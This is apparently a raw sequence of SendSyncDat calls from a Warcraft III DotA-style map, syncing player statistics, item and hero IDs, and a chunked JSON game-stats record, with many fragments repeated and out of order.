	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "1", "1", 0);
	SendSyncDat("dr.x", "1", "2", 10);
	SendSyncDat("dr.x", "1", "3", 42);
	SendSyncDat("dr.x", "1", "4", 5);
	SendSyncDat("dr.x", "1", "5", 1);
	SendSyncDat("dr.x", "1", "6", 263);
	SendSyncDat("dr.x", "1", "7", 8);
	SendSyncDat("dr.x", "1", "8_0", 1227902028);
	SendSyncDat("dr.x", "1", "8_1", 1227902281);
	SendSyncDat("dr.x", "1", "8_2", 1227903818);
	SendSyncDat("dr.x", "1", "8_3", 1227896137);
	SendSyncDat("dr.x", "1", "8_4", 1227895898);
	SendSyncDat("dr.x", "1", "8_5", 1227896116);
	SendSyncDat("dr.x", "1", "9", 1333027688);
	SendSyncDat("dr.x", "1", "id", 1);
	SendSyncDat("dr.x", "7", "1", 17);
	SendSyncDat("dr.x", "7", "2", 2);
	SendSyncDat("dr.x", "7", "3", 155);
	SendSyncDat("dr.x", "7", "4", 5);
	SendSyncDat("dr.x", "7", "5", 14);
	SendSyncDat("dr.x", "7", "6", 4586);
	SendSyncDat("dr.x", "7", "7", 36);
	SendSyncDat("dr.x", "7", "8_0", 1227900746);
	SendSyncDat("dr.x", "7", "8_1", 1227901785);
	SendSyncDat("dr.x", "7", "8_2", 1227901010);
	SendSyncDat("dr.x", "7", "8_3", 1227897158);
	SendSyncDat("dr.x", "7", "8_4", 1227900994);
	SendSyncDat("dr.x", "7", "8_5", 1227899192);
	SendSyncDat("dr.x", "7", "9", 1160786242);
	SendSyncDat("dr.x", "7", "id", 6);
	SendSyncDat("dr.x", "2", "1", 0);
	SendSyncDat("dr.x", "2", "2", 9);
	SendSyncDat("dr.x", "2", "3", 96);
	SendSyncDat("dr.x", "2", "4", 8);
	SendSyncDat("dr.x", "2", "5", 0);
	SendSyncDat("dr.x", "2", "6", 667);
	SendSyncDat("dr.x", "2", "7", 24);
	SendSyncDat("dr.x", "2", "8_0", 1227895380);
	SendSyncDat("dr.x", "2", "8_1", 1227895864);
	SendSyncDat("dr.x", "2", "8_2", 1227903025);
	SendSyncDat("dr.x", "2", "8_3", 1227896137);
	SendSyncDat("dr.x", "2", "8_4", 0);
	SendSyncDat("dr.x", "2", "8_5", 1227896921);
	SendSyncDat("dr.x", "2", "9", 1315074670);
	SendSyncDat("dr.x", "2", "id", 2);
	SendSyncDat("dr.x", "8", "1", 10);
	SendSyncDat("dr.x", "8", "2", 1);
	SendSyncDat("dr.x", "8", "3", 88);
	SendSyncDat("dr.x", "8", "4", 2);
	SendSyncDat("dr.x", "8", "5", 20);
	SendSyncDat("dr.x", "8", "6", 2070);
	SendSyncDat("dr.x", "8", "7", 0);
	SendSyncDat("dr.x", "8", "8_0", 1227895880);
	SendSyncDat("dr.x", "8", "8_1", 1227900994);
	SendSyncDat("dr.x", "8", "8_2", 1227894863);
	SendSyncDat("dr.x", "8", "8_3", 1227899213);
	SendSyncDat("dr.x", "8", "8_4", 1227902793);
	SendSyncDat("dr.x", "8", "8_5", 1227902028);
	SendSyncDat("dr.x", "8", "9", 1215128178);
	SendSyncDat("dr.x", "8", "id", 7);
	SendSyncDat("dr.x", "3", "1", 2);
	SendSyncDat("dr.x", "3", "2", 9);
	SendSyncDat("dr.x", "3", "3", 65);
	SendSyncDat("dr.x", "3", "4", 7);
	SendSyncDat("dr.x", "3", "5", 0);
	SendSyncDat("dr.x", "3", "6", 42);
	SendSyncDat("dr.x", "3", "7", 3);
	SendSyncDat("dr.x", "3", "8_0", 1227903028);
	SendSyncDat("dr.x", "3", "8_1", 1227895880);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "3", "8_2", 1227900746);
	SendSyncDat("dr.x", "3", "8_3", 1227896904);
	SendSyncDat("dr.x", "3", "8_4", 1227896916);
	SendSyncDat("dr.x", "3", "8_5", 0);
	SendSyncDat("dr.x", "3", "9", 1433631084);
	SendSyncDat("dr.x", "3", "id", 3);
	SendSyncDat("dr.x", "9", "1", 2);
	SendSyncDat("dr.x", "9", "2", 3);
	SendSyncDat("dr.x", "9", "3", 79);
	SendSyncDat("dr.x", "9", "4", 2);
	SendSyncDat("dr.x", "9", "5", 9);
	SendSyncDat("dr.x", "9", "6", 2529);
	SendSyncDat("dr.x", "9", "7", 16);
	SendSyncDat("dr.x", "9", "8_0", 1227902028);
	SendSyncDat("dr.x", "9", "8_1", 1227896911);
	SendSyncDat("dr.x", "9", "8_2", 1227896153);
	SendSyncDat("dr.x", "9", "8_3", 1227897137);
	SendSyncDat("dr.x", "9", "8_4", 0);
	SendSyncDat("dr.x", "9", "8_5", 0);
	SendSyncDat("dr.x", "9", "9", 1311780946);
	SendSyncDat("dr.x", "9", "id", 8);
	SendSyncDat("dr.x", "4", "1", 1);
	SendSyncDat("dr.x", "4", "2", 6);
	SendSyncDat("dr.x", "4", "3", 15);
	SendSyncDat("dr.x", "4", "4", 0);
	SendSyncDat("dr.x", "4", "5", 1);
	SendSyncDat("dr.x", "4", "6", 6);
	SendSyncDat("dr.x", "4", "7", 37);
	SendSyncDat("dr.x", "4", "8_0", 0);
	SendSyncDat("dr.x", "4", "8_1", 0);
	SendSyncDat("dr.x", "4", "8_2", 0);
	SendSyncDat("dr.x", "4", "8_3", 0);
	SendSyncDat("dr.x", "4", "8_4", 0);
	SendSyncDat("dr.x", "4", "8_5", 0);
	SendSyncDat("dr.x", "4", "9", 1332766568);
	SendSyncDat("dr.x", "4", "id", 4);
	SendSyncDat("dr.x", "10", "1", 10);
	SendSyncDat("dr.x", "10", "2", 9);
	SendSyncDat("dr.x", "10", "3", 34);
	SendSyncDat("dr.x", "10", "4", 0);
	SendSyncDat("dr.x", "10", "5", 2);
	SendSyncDat("dr.x", "10", "6", 544);
	SendSyncDat("dr.x", "10", "7", 0);
	SendSyncDat("dr.x", "10", "8_0", 1227900746);
	SendSyncDat("dr.x", "10", "8_1", 1227903809);
	SendSyncDat("dr.x", "10", "8_2", 1227895880);
	SendSyncDat("dr.x", "10", "8_3", 1227896116);
	SendSyncDat("dr.x", "10", "8_4", 0);
	SendSyncDat("dr.x", "10", "8_5", 0);
	SendSyncDat("dr.x", "10", "9", 1211117643);
	SendSyncDat("dr.x", "10", "id", 9);
	SendSyncDat("dr.x", "5", "1", 3);
	SendSyncDat("dr.x", "5", "2", 7);
	SendSyncDat("dr.x", "5", "3", 55);
	SendSyncDat("dr.x", "5", "4", 6);
	SendSyncDat("dr.x", "5", "5", 3);
	SendSyncDat("dr.x", "5", "6", 790);
	SendSyncDat("dr.x", "5", "7", 4);
	SendSyncDat("dr.x", "5", "8_0", 1227901785);
	SendSyncDat("dr.x", "5", "8_1", 1227900744);
	SendSyncDat("dr.x", "5", "8_2", 1227895376);
	SendSyncDat("dr.x", "5", "8_3", 1227903025);
	SendSyncDat("dr.x", "5", "8_4", 1227899469);
	SendSyncDat("dr.x", "5", "8_5", 1227902793);
	SendSyncDat("dr.x", "5", "9", 1432510828);
	SendSyncDat("dr.x", "5", "id", 5);
	SendSyncDat("dr.x", "11", "1", 2);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "11", "2", 1);
	SendSyncDat("dr.x", "11", "3", 68);
	SendSyncDat("dr.x", "11", "4", 5);
	SendSyncDat("dr.x", "11", "5", 9);
	SendSyncDat("dr.x", "11", "6", 1350);
	SendSyncDat("dr.x", "11", "7", 0);
	SendSyncDat("dr.x", "11", "8_0", 1227902265);
	SendSyncDat("dr.x", "11", "8_1", 1227896907);
	SendSyncDat("dr.x", "11", "8_2", 1227895380);
	SendSyncDat("dr.x", "11", "8_3", 1227896921);
	SendSyncDat("dr.x", "11", "8_4", 1227900994);
	SendSyncDat("dr.x", "11", "8_5", 0);
	SendSyncDat("dr.x", "11", "9", 1212365106);
	SendSyncDat("dr.x", "11", "id", 10);
	SendSyncDat("dr.x", "Global", "Winner", 2);
	SendSyncDat("dr.x", "Global", "m", 27);
	SendSyncDat("dr.x", "Global", "s", 58);
	SendSyncDat("dr.x", "game_stats", "{\"first_hero_kill_time\":262,\"game_start_time\":279,\"players\":[{\"assists\":1,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":42,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":10,\"firestone\":0,\"froststone\":0,\"gold\":263,\"hero\":1333027688,\"id\":1,\"items\":[1227902028,1227902281,1227903818,1227896137,", 1);
	SendSyncDat("dr.x", "game_stats", "1227895898,1227896116],\"kills\":0,\"left_time\":0,\"neutral_kills\":8,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_ki", 1);
	SendSyncDat("dr.x", "game_stats", "lls\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":8,\"creep_kills\":96,\"deaths\":9,\"firestone\":0,\"froststone\":0", 1);
	SendSyncDat("dr.x", "game_stats", ",\"gold\":667,\"hero\":1315074670,\"id\":2,\"items\":[1227895380,1227895864,1227903025,1227896137,0,1227896921],\"kills\":0,\"left_time\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"neutral_kills\":24,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":0,\"courier_", 1);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"creep_denies\":7,\"creep_kills\":65,\"deaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":42,\"hero\":1433631084,\"id\":3,\"items\":[1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
